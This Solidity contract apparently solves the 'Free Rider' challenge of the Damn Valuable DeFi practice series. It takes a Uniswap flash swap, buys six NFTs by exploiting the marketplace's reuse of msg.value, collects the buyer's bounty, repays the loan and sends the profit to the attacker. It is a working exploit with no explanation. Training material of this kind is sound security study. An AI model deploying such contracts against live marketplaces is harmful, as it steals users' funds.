pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderAttack is IUniswapV2Callee,IERC721Receiver {
    address weth;
    FreeRiderNFTMarketplace freeRiderNFTMarketplace;
    FreeRiderBuyer freeRiderBuyer;
    DamnValuableNFT public nft_token;
    IUniswapV2Pair pair;
    address attacker;
    uint8 number_of_nfts;
    uint256 nft_price;

    constructor(
        address _nft,
        address _weth,
        address _pair,
        address _freeRiderBuyer,
        address _freeRiderNFTMarketplace,
        uint8 _number_of_nfts,
        uint256 _nft_price
    ) {
        nft_token = DamnValuableNFT(_nft);
        weth = _weth;
        freeRiderBuyer = FreeRiderBuyer(_freeRiderBuyer);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(
            payable(_freeRiderNFTMarketplace)
        );
        attacker = msg.sender;
        nft_price = _nft_price;
        number_of_nfts = _number_of_nfts;
        pair = IUniswapV2Pair(_pair);
    }

    function exploit () public { 
        bytes memory data = abi.encode(pair.token0(),nft_price);
        pair.swap( nft_price,0, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) public override {
        require(
            sender == address(this),
            "Sorry it wasn't me who made this call"
        );
        require(msg.sender == address(pair),"Wrong pair");
         (address weth_token_address, uint amount) = abi.decode(data, (address, uint));
         uint fee= ((amount * 3) / 997) + 1;
         uint debt = amount+fee;
         IWETH weth = IWETH(weth_token_address);

         weth.withdraw(amount);

         console.log("amount %s", amount);
         console.log("balance %s",address(this).balance);

        uint current_balance=address(this).balance;

        //  Buy All the NFTS
        uint256[] memory nft_tokens_id = new uint256[](6);
        for (uint i=0;i<number_of_nfts;i++){
            nft_tokens_id[i]=i;
        }
        freeRiderNFTMarketplace.buyMany{value:nft_price}(nft_tokens_id);

        console.log("my contract balance %s to transfer to %s",nft_token.balanceOf(address(this)),attacker);
        //  Transfer them to the partner
        for(uint i=0;i<6;i++){
            nft_token.approve(attacker, i);
            nft_token.safeTransferFrom(address(this), address(freeRiderBuyer), i);
        }
        console.log("my contract transfered it all %s",nft_token.balanceOf(address(this)));

        // Receive compensation

        require(address(this).balance > current_balance,"Balance hasn't changed");
        // Payback my debt

        weth.deposit{value:debt}();
        IERC20(weth_token_address).transfer(address(pair), debt);

        // Transfer the $$ to my address

        console.log("%s", address(this).balance);
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable{}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) override external  returns (bytes4){
         return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
